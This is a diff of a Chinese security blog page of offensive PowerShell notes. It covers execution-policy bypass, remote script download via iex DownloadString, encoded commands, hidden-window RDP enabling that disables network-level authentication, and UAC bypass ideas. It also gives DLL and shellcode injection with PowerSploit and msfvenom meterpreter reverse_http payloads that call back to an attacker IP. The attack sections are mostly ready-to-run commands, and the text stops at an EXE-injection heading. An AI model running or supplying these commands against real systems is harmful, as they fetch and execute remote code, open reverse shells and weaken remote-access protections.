@@ -255,32 +255,8 @@
 <hr>
 <p>本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途…</p>
 <h2 id="0x01-基础介绍"><a href="#0x01-基础介绍" class="headerlink" title="0x01 基础介绍"></a>0x01 基础介绍</h2><p><strong>cmdlet查询</strong></p>
-<pre><code>1）Get-Verb：返回大多数命令遵循的谓词的列表。响应包括有关这些谓词的功能的说明。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1）Get-Verb：返回大多数命令遵循的谓词的列表。响应包括有关这些谓词的功能的说明。</span><br><span class="line"></span><br><span class="line">2）Get-Command：检索计算机上安装的所有命令的列表。</span><br><span class="line"></span><br><span class="line">    a. 使用不同的参数筛选 Get-Command 的输出：Get-Command -Name &#x27;*Process&#x27;  //除了 -Name 之外，还可以根据 -ParameterName 和 -Type 之类的内容进行筛选</span><br><span class="line"></span><br><span class="line">    b. 根据名词和谓词进行筛选：Get-Command -Verb &#x27;Get&#x27;   //指定 -Verb 作为参数，列出谓词部分为 Get 的所有命令</span><br><span class="line"></span><br><span class="line">    c. 根据名词进行筛选：Get-Command -Noun U*    //指定 -Noun 作为参数和字符串参数</span><br><span class="line"></span><br><span class="line">    d. 谓词/名词组合使用：Get-Command -Verb Get -Noun U*</span><br><span class="line"></span><br><span class="line">    e. Select-Object：帮助你从一个或多个对象中选取特定属性，如：Get-Command | Select-Object -First 3  //获取从顶部往下数的前3个命令</span><br><span class="line"></span><br><span class="line">    f. Where-Object：帮助你根据属性值从集合中选择对象，如：Get-Process | Where-Object &#123;$_.ProcessName -like &quot;p*&quot;&#125;  //查找ProcessName 以 p 开头的所有 process 对象</span><br><span class="line"></span><br><span class="line">3）Get-Member：它在基于对象的输出上运行，并且能够发现可用于命令的对象、属性和方法。</span><br><span class="line"></span><br><span class="line">    Get-Process | Get-Member  //结果显示返回的类型（以 TypeName 形式）以及对象的所有属性和方法</span><br><span class="line"></span><br><span class="line">    Get-Process | Get-Member -MemberType Method   //使用 -MemberType 参数，可以指定要查看所有方法</span><br><span class="line"></span><br><span class="line">    Get-Process | Get-Member | Select-Object Name, Definition  //使用 Select-Object，可以指定要查看哪些列</span><br><span class="line"></span><br><span class="line">4）Get-Help：以命令名称为参数调用此命令，将显示一个帮助页面，其中说明了命令的各个部分。</span><br></pre></td></tr></table></figure>
 
-2）Get-Command：检索计算机上安装的所有命令的列表。
-
-    a. 使用不同的参数筛选 Get-Command 的输出：Get-Command -Name &#39;*Process&#39;  //除了 -Name 之外，还可以根据 -ParameterName 和 -Type 之类的内容进行筛选
-
-    b. 根据名词和谓词进行筛选：Get-Command -Verb &#39;Get&#39;   //指定 -Verb 作为参数，列出谓词部分为 Get 的所有命令
-
-    c. 根据名词进行筛选：Get-Command -Noun U*    //指定 -Noun 作为参数和字符串参数
-
-    d. 谓词/名词组合使用：Get-Command -Verb Get -Noun U*
-
-    e. Select-Object：帮助你从一个或多个对象中选取特定属性，如：Get-Command | Select-Object -First 3  //获取从顶部往下数的前3个命令
-
-    f. Where-Object：帮助你根据属性值从集合中选择对象，如：Get-Process | Where-Object &#123;$_.ProcessName -like &quot;p*&quot;&#125;  //查找ProcessName 以 p 开头的所有 process 对象
-
-3）Get-Member：它在基于对象的输出上运行，并且能够发现可用于命令的对象、属性和方法。
-
-    Get-Process | Get-Member  //结果显示返回的类型（以 TypeName 形式）以及对象的所有属性和方法
-
-    Get-Process | Get-Member -MemberType Method   //使用 -MemberType 参数，可以指定要查看所有方法
-
-    Get-Process | Get-Member | Select-Object Name, Definition  //使用 Select-Object，可以指定要查看哪些列
-
-4）Get-Help：以命令名称为参数调用此命令，将显示一个帮助页面，其中说明了命令的各个部分。
-</code></pre>
 <p><strong>执行策略</strong></p>
 <p>PowerShell 执行策略是一项安全功能，用于控制 PowerShell 加载配置文件和运行脚本的条件</p>
 <table>
@@ -320,426 +296,74 @@
 </tr>
 </tbody></table>
 <p><strong>绕过安全策略</strong></p>
-<pre><code>1）获取当前执行策略
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1）获取当前执行策略</span><br><span class="line"></span><br><span class="line">Get-ExecutionPolicy</span><br><span class="line"></span><br><span class="line">2) 设置Bypass策略</span><br><span class="line"></span><br><span class="line">Set-ExecutionPolicy -ExecutionPolicy Bypass</span><br><span class="line"></span><br><span class="line">3）通过管道输入进入ps</span><br><span class="line"></span><br><span class="line">Get-Content .\test.ps1 | powershell.exe -noprofile -</span><br><span class="line"></span><br><span class="line">4）通过远程下载脚本来绕过</span><br><span class="line"></span><br><span class="line">powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://192.169.10.1/test.ps1&#x27;)&quot;</span><br><span class="line"></span><br><span class="line">5）通过BASE64编码执行</span><br><span class="line"></span><br><span class="line">$command = &quot;Write-Host &#x27;Hello World!&#x27;&quot;</span><br><span class="line">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) </span><br><span class="line">$encodedCommand = [Convert]::ToBase64String($bytes) </span><br><span class="line">powershell.exe -EncodedCommand $encodedCommand</span><br></pre></td></tr></table></figure>
 
-Get-ExecutionPolicy
-
-2) 设置Bypass策略
-
-Set-ExecutionPolicy -ExecutionPolicy Bypass
-
-3）通过管道输入进入ps
-
-Get-Content .\test.ps1 | powershell.exe -noprofile -
-
-4）通过远程下载脚本来绕过
-
-powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://192.169.10.1/test.ps1&#39;)&quot;
-
-5）通过BASE64编码执行
-
-$command = &quot;Write-Host &#39;Hello World!&#39;&quot;
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
-$encodedCommand = [Convert]::ToBase64String($bytes) 
-powershell.exe -EncodedCommand $encodedCommand
-</code></pre>
 <p><strong>通过CMD执行powershell</strong></p>
-<pre><code>PowerShell[.exe]
-       [-PSConsoleFile &lt;file&gt; | -Version &lt;version&gt;]
-       [-EncodedCommand &lt;Base64EncodedCommand&gt;]
-       [-ExecutionPolicy &lt;ExecutionPolicy&gt;]
-       [-File &lt;filePath&gt; &lt;args&gt;]
-       [-InputFormat &#123;Text | XML&#125;] 
-       [-NoExit]
-       [-NoLogo]
-       [-NonInteractive] 
-       [-NoProfile] 
-       [-OutputFormat &#123;Text | XML&#125;] 
-       [-Sta]
-       [-WindowStyle &lt;style&gt;]
-       [-Command &#123; - | &lt;script-block&gt; [-args &lt;arg-array&gt;]
-                     | &lt;string&gt; [&lt;CommandParameters&gt;] &#125; ]
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">PowerShell[.exe]</span><br><span class="line">       [-PSConsoleFile &lt;file&gt; | -Version &lt;version&gt;]</span><br><span class="line">       [-EncodedCommand &lt;Base64EncodedCommand&gt;]</span><br><span class="line">       [-ExecutionPolicy &lt;ExecutionPolicy&gt;]</span><br><span class="line">       [-File &lt;filePath&gt; &lt;args&gt;]</span><br><span class="line">       [-InputFormat &#123;Text | XML&#125;] </span><br><span class="line">       [-NoExit]</span><br><span class="line">       [-NoLogo]</span><br><span class="line">       [-NonInteractive] </span><br><span class="line">       [-NoProfile] </span><br><span class="line">       [-OutputFormat &#123;Text | XML&#125;] </span><br><span class="line">       [-Sta]</span><br><span class="line">       [-WindowStyle &lt;style&gt;]</span><br><span class="line">       [-Command &#123; - | &lt;script-block&gt; [-args &lt;arg-array&gt;]</span><br><span class="line">                     | &lt;string&gt; [&lt;CommandParameters&gt;] &#125; ]</span><br><span class="line"></span><br><span class="line">PowerShell[.exe] -Help | -? | /?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-Command            # 需要执行的代码</span><br><span class="line">-ExecutionPolicy    # 设置默认的执行策略，一般使用Bypass</span><br><span class="line">-EncodedCommand     # 执行Base64代码</span><br><span class="line">-File               # 需要执行的脚本名</span><br><span class="line">-NoExit             # 执行完成命令之后不会立即退出，运行完之后还会继续停留在PS的界面</span><br><span class="line">-NoLogo             # 不输出PS的Banner信息</span><br><span class="line">-Noninteractive     # 不开启交互式的会话</span><br><span class="line">-NoProfile          # 不使用当前用户使用的配置文件</span><br><span class="line">-Sta                # 以单线程模式启动ps</span><br><span class="line">-Version            # 设置用什么版本去执行代码</span><br><span class="line">-WindowStyle        # 设置Powershell的执行窗口，有如下参数Normal, Minimized, Maximized, or Hidden</span><br></pre></td></tr></table></figure>
 
-PowerShell[.exe] -Help | -? | /?
-
-
--Command            # 需要执行的代码
--ExecutionPolicy    # 设置默认的执行策略，一般使用Bypass
--EncodedCommand     # 执行Base64代码
--File               # 需要执行的脚本名
--NoExit             # 执行完成命令之后不会立即退出，运行完之后还会继续停留在PS的界面
--NoLogo             # 不输出PS的Banner信息
--Noninteractive     # 不开启交互式的会话
--NoProfile          # 不使用当前用户使用的配置文件
--Sta                # 以单线程模式启动ps
--Version            # 设置用什么版本去执行代码
--WindowStyle        # 设置Powershell的执行窗口，有如下参数Normal, Minimized, Maximized, or Hidden
-</code></pre>
 <p><strong>常用命令</strong></p>
-<pre><code>1) 版本/执行策略查看
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">1) 版本/执行策略查看</span><br><span class="line"></span><br><span class="line">    $PSVersionTable  # 查看版本</span><br><span class="line">    Get-ExecutionPolicy  #检查当前执行策略</span><br><span class="line">    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned   # 将PowerShell 执行策略更改为远程签名</span><br><span class="line"></span><br><span class="line">2）开启PS远程访问</span><br><span class="line"></span><br><span class="line">    # Enable psremoting</span><br><span class="line">    Enable-PSRemoting</span><br><span class="line"></span><br><span class="line">    # Add remote host to trusted hosts:</span><br><span class="line">    Set-Item wsman:\localhost\client\trustedhosts 10.0.0.2</span><br><span class="line">    Test-WsMan 10.0.0.2 # test connection to remote host</span><br><span class="line"></span><br><span class="line">    # Check current remote session&#x27;s permissions</span><br><span class="line">    Get-PSSessionConfiguration | Format-Table -Property Name, Permission -Auto</span><br><span class="line">    Set-PSSessionConfiguration -Name Microsoft.ServerManager -AccessMode Remote -Force</span><br><span class="line"></span><br><span class="line">    # Open remote session</span><br><span class="line">    Enter-PSSession -ComputerName 10.0.0.2 -Credential Domain\Username -Authentication Default</span><br><span class="line">    $SS = New-PSSession -ComputerName 10.0.0.2 -Credential Domain\Username -Authentication Default</span><br><span class="line">    Get-PSSession Remove-PSSession</span><br><span class="line">    Invoke-Command -Session $SS -ScriptBlock &#123;Get-Culture&#125;</span><br><span class="line">    Enter/New-PSSession -SkipCACheck -SkipCNCheck -UseSSL</span><br><span class="line"></span><br><span class="line">    # Disable remoting in powershell</span><br><span class="line">    Disable-PSRemoting</span><br><span class="line">    Stop-Service winrm</span><br><span class="line">    Set-Service -Name winrm -StartupType Disabled</span><br><span class="line"></span><br><span class="line">3）创建 BITS 传输作业</span><br><span class="line"></span><br><span class="line">    # Import-Module BitsTransfer</span><br><span class="line">    Start-BitsTransfer -Priority Foreground -Source &quot;https://nmap.org/ncrack/dist/*.tar.gz&quot; -Destination &quot;C:\temp\&quot;</span><br><span class="line"></span><br><span class="line">    $Cred = Get-Credential</span><br><span class="line">    Start-BitsTransfer -Authentication ntlm -Credential $Cred -Priority Foreground -Source &quot;\\192.168.1.51\a\test.txt&quot; -Destination &quot;C:\temp\test.txt&quot;</span><br><span class="line"></span><br><span class="line">4）获取补丁</span><br><span class="line"></span><br><span class="line">    get-hotfix | out-gridview</span><br><span class="line"></span><br><span class="line">5）安全描述符SDDL操作</span><br><span class="line"></span><br><span class="line">    $sddl = &quot;D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;SO)(A;;CCLCSWRPLORC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;LS)(A;;CCLCSWRPWPDTLOCRRC;;;NS)&quot;</span><br><span class="line">    $ACLObject = New-Object -TypeName System.Security.AccessControl.DirectorySecurity</span><br><span class="line">    $ACLObject.SetSecurityDescriptorSddlForm($sddl)</span><br><span class="line">    $ACLObject.Access</span><br><span class="line"></span><br><span class="line">6）创建凭据</span><br><span class="line"></span><br><span class="line">    # get credentials interactive</span><br><span class="line">    $creds = Get-Credential</span><br><span class="line"></span><br><span class="line">    # non-interactive</span><br><span class="line">    $secpasswd = ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force</span><br><span class="line">    $creds = New-Object System.Management.Automation.PSCredential (&quot;username&quot;, $secpasswd)</span><br><span class="line"></span><br><span class="line">7）开启/关闭RDP</span><br><span class="line"></span><br><span class="line">    RDP开启：powershell.exe -w hidden -nop -c &quot;reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f; if($?) &#123;$null = netsh firewall set service type = remotedesktop mod = enable;$null = reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot; /v UserAuthentication /t REG_DWORD /d 0 /f &#125;&quot;</span><br><span class="line"></span><br><span class="line">    RDP关闭: powershell.exe -w hidden -nop -c &quot;reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 1 /f; if ($?) &#123; $null = reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot; /v UserAuthentication /t REG_DWORD /d 1 /f &#125;&quot;</span><br></pre></td></tr></table></figure>
 
-    $PSVersionTable  # 查看版本
-    Get-ExecutionPolicy  #检查当前执行策略
-    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned   # 将PowerShell 执行策略更改为远程签名
-
-2）开启PS远程访问
-
-    # Enable psremoting
-    Enable-PSRemoting
-
-    # Add remote host to trusted hosts:
-    Set-Item wsman:\localhost\client\trustedhosts 10.0.0.2
-    Test-WsMan 10.0.0.2 # test connection to remote host
-
-    # Check current remote session&#39;s permissions
-    Get-PSSessionConfiguration | Format-Table -Property Name, Permission -Auto
-    Set-PSSessionConfiguration -Name Microsoft.ServerManager -AccessMode Remote -Force
-
-    # Open remote session
-    Enter-PSSession -ComputerName 10.0.0.2 -Credential Domain\Username -Authentication Default
-    $SS = New-PSSession -ComputerName 10.0.0.2 -Credential Domain\Username -Authentication Default
-    Get-PSSession Remove-PSSession
-    Invoke-Command -Session $SS -ScriptBlock &#123;Get-Culture&#125;
-    Enter/New-PSSession -SkipCACheck -SkipCNCheck -UseSSL
-
-    # Disable remoting in powershell
-    Disable-PSRemoting
-    Stop-Service winrm
-    Set-Service -Name winrm -StartupType Disabled
-
-3）创建 BITS 传输作业
-
-    # Import-Module BitsTransfer
-    Start-BitsTransfer -Priority Foreground -Source &quot;https://nmap.org/ncrack/dist/*.tar.gz&quot; -Destination &quot;C:\temp\&quot;
-
-    $Cred = Get-Credential
-    Start-BitsTransfer -Authentication ntlm -Credential $Cred -Priority Foreground -Source &quot;\\192.168.1.51\a\test.txt&quot; -Destination &quot;C:\temp\test.txt&quot;
-
-4）获取补丁
-
-    get-hotfix | out-gridview
-
-5）安全描述符SDDL操作
-
-    $sddl = &quot;D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;SO)(A;;CCLCSWRPLORC;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;LS)(A;;CCLCSWRPWPDTLOCRRC;;;NS)&quot;
-    $ACLObject = New-Object -TypeName System.Security.AccessControl.DirectorySecurity
-    $ACLObject.SetSecurityDescriptorSddlForm($sddl)
-    $ACLObject.Access
-
-6）创建凭据
-
-    # get credentials interactive
-    $creds = Get-Credential
-
-    # non-interactive
-    $secpasswd = ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force
-    $creds = New-Object System.Management.Automation.PSCredential (&quot;username&quot;, $secpasswd)
-
-7）开启/关闭RDP
-
-    RDP开启：powershell.exe -w hidden -nop -c &quot;reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f; if($?) &#123;$null = netsh firewall set service type = remotedesktop mod = enable;$null = reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot; /v UserAuthentication /t REG_DWORD /d 0 /f &#125;&quot;
-
-    RDP关闭: powershell.exe -w hidden -nop -c &quot;reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 1 /f; if ($?) &#123; $null = reg add \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot; /v UserAuthentication /t REG_DWORD /d 1 /f &#125;&quot;
-</code></pre>
 <h2 id="0x02-进阶技术"><a href="#0x02-进阶技术" class="headerlink" title="0x02 进阶技术"></a>0x02 进阶技术</h2><h3 id="1-WMI技术"><a href="#1-WMI技术" class="headerlink" title="1. WMI技术"></a>1. WMI技术</h3><p><strong>常用类</strong></p>
-<pre><code>主机/操作系统信息:Win32_OperatingSystem, Win32_ComputerSystem
-文件/目录列举: CIM_DataFile
-磁盘卷列举: Win32_Volume
-注册表操作: StdRegProv
-运行进程: Win32_Process
-服务列举: Win32_Service
-事件日志: Win32_NtLogEvent
-登录账户: Win32_LoggedOnUser
-共享: Win32_Share
-已安装补丁: Win32_QuickFixEngineering
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">主机/操作系统信息:Win32_OperatingSystem, Win32_ComputerSystem</span><br><span class="line">文件/目录列举: CIM_DataFile</span><br><span class="line">磁盘卷列举: Win32_Volume</span><br><span class="line">注册表操作: StdRegProv</span><br><span class="line">运行进程: Win32_Process</span><br><span class="line">服务列举: Win32_Service</span><br><span class="line">事件日志: Win32_NtLogEvent</span><br><span class="line">登录账户: Win32_LoggedOnUser</span><br><span class="line">共享: Win32_Share</span><br><span class="line">已安装补丁: Win32_QuickFixEngineering</span><br></pre></td></tr></table></figure>
+
 <p><strong>powershell-wmi</strong></p>
-<pre><code>Get-WmiObject -Query &quot;select * from win32_service where name=&#39;WinRM&#39;&quot;
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Query &quot;select * from win32_service where name=&#x27;WinRM&#x27;&quot;</span><br><span class="line"></span><br><span class="line">Get-WmiObject -Class Win32_Process | Where-Object &#123;$_.name -like &quot;*explorer*&quot;&#125;</span><br><span class="line"></span><br><span class="line">Get-Wmiobject -query &quot;select * from win32_service where name=&#x27;WinRM&#x27;&quot; -computername server01, server02</span><br><span class="line"></span><br><span class="line">Get-WmiObject -Class Win32_QuickFixEngineering</span><br></pre></td></tr></table></figure>
 
-Get-WmiObject -Class Win32_Process | Where-Object &#123;$_.name -like &quot;*explorer*&quot;&#125;
-
-Get-Wmiobject -query &quot;select * from win32_service where name=&#39;WinRM&#39;&quot; -computername server01, server02
-
-Get-WmiObject -Class Win32_QuickFixEngineering
-</code></pre>
 <p><strong>WMI触发器</strong></p>
-<pre><code>事件触发条件
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">事件触发条件</span><br><span class="line"></span><br><span class="line">1) 事件筛选器：描述事件并且执行WQL事件查询。</span><br><span class="line"></span><br><span class="line">2）事件消费者：事件消费是一个派生自 __EventConsumer 系统类的类，它表示了在事件触发时的动作。常用的消费类有下面两个： </span><br><span class="line">    a. ActiveScriptEventConsumer - 执行嵌入的 VBScript 或 JScript 脚本 payload </span><br><span class="line">    b. CommandLineEventConsumer - 执行一个命令行程序</span><br><span class="line"></span><br><span class="line">3）消费者绑定筛选器：将筛选器绑定到消费者的注册机制。</span><br></pre></td></tr></table></figure>
 
-1) 事件筛选器：描述事件并且执行WQL事件查询。
-
-2）事件消费者：事件消费是一个派生自 __EventConsumer 系统类的类，它表示了在事件触发时的动作。常用的消费类有下面两个： 
-    a. ActiveScriptEventConsumer - 执行嵌入的 VBScript 或 JScript 脚本 payload 
-    b. CommandLineEventConsumer - 执行一个命令行程序
-
-3）消费者绑定筛选器：将筛选器绑定到消费者的注册机制。
-</code></pre>
 <h3 id="2-注入技术"><a href="#2-注入技术" class="headerlink" title="2. 注入技术"></a>2. 注入技术</h3><p><strong>DLL注入</strong></p>
 <p>DLL注入就是将代码插入&#x2F;注入到正在运行的进程中的过程，注入的代码是动态链接库（DLL）的形式。因为DLL（如UNIX中的共享库）是在运行时根据需要来进行加载，实际上还可以使用其他各种形式（任何PE文件、shellcode&#x2F;assembly等）来”注入”代码</p>
 <p><strong>Bypass UAC</strong></p>
-<pre><code>1) 使用wusa.exe
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1) 使用wusa.exe</span><br><span class="line"></span><br><span class="line">2) Dll劫持</span><br><span class="line"></span><br><span class="line">3) IFileOperation-COM对象</span><br><span class="line">推荐注入explorer.exe这样的进程，只要操作系统在运行，这个进程能稳定的让我们注入</span><br></pre></td></tr></table></figure>
 
-2) Dll劫持
-
-3) IFileOperation-COM对象
-推荐注入explorer.exe这样的进程，只要操作系统在运行，这个进程能稳定的让我们注入
-</code></pre>
 <p><strong>Powershell-DLL注入</strong></p>
 <p>Powersploit中的Invoke-DllInjection已经完成对于DLL注入的利用，利用过程如下：</p>
-<pre><code>1) 利用IEX下载脚本
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1) 利用IEX下载脚本</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1&quot;)</span><br><span class="line"></span><br><span class="line">2) 使用MSF生成恶意DLL</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.168.1 LPORT=8080 -f dll -o test.dll</span><br><span class="line"></span><br><span class="line">3) 通过Ps加载DLL完成利用</span><br><span class="line"></span><br><span class="line">查看一个我们当前用户能注入的进程，在这里选用explorer进程来进行注入</span><br><span class="line"></span><br><span class="line">Get-Process -name &quot;explorer&quot; | Select-Object Id</span><br><span class="line"></span><br><span class="line">Invoke-DllInjection -ProcessID 3628 -DLL .\test.dll</span><br></pre></td></tr></table></figure>
 
-IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1&quot;)
-
-2) 使用MSF生成恶意DLL
-
-msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.168.1 LPORT=8080 -f dll -o test.dll
-
-3) 通过Ps加载DLL完成利用
-
-查看一个我们当前用户能注入的进程，在这里选用explorer进程来进行注入
-
-Get-Process -name &quot;explorer&quot; | Select-Object Id
-
-Invoke-DllInjection -ProcessID 3628 -DLL .\test.dll
-</code></pre>
 <p><strong>Powershell-ShellCode注入</strong></p>
 <p>使用powersploit代码:Invoke-Shellcode 进行shellcode注入，利用过程如下：</p>
-<pre><code>1) 利用IEX下载脚本
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1) 利用IEX下载脚本</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&quot;)</span><br><span class="line"></span><br><span class="line">2) 使用MSF生成恶意代码</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.168.1 LPORT=8080 -f powershell -o test</span><br><span class="line"></span><br><span class="line">通过Web下载的方式来导入shellcode</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.168.1/test&quot;)</span><br><span class="line"></span><br><span class="line">3) 通过Ps加载shellcode完成利用</span><br><span class="line"></span><br><span class="line">Invoke-Shellcode -Shellcode ($buf)    # 注入到当前powershell进程</span><br><span class="line"></span><br><span class="line">Invoke-Shellcode -Shellcode ($buf) -ProcessID 2366  # 注入到指定进程(需判断是否有权限)</span><br></pre></td></tr></table></figure>
 
-IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&quot;)
-
-2) 使用MSF生成恶意代码
-
-msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.168.1 LPORT=8080 -f powershell -o test
-
-通过Web下载的方式来导入shellcode
-
-IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.168.1/test&quot;)
-
-3) 通过Ps加载shellcode完成利用
-
-Invoke-Shellcode -Shellcode ($buf)    # 注入到当前powershell进程
-
-Invoke-Shellcode -Shellcode ($buf) -ProcessID 2366  # 注入到指定进程(需判断是否有权限)
-</code></pre>
 <p><strong>Powershell-EXE注入</strong></p>
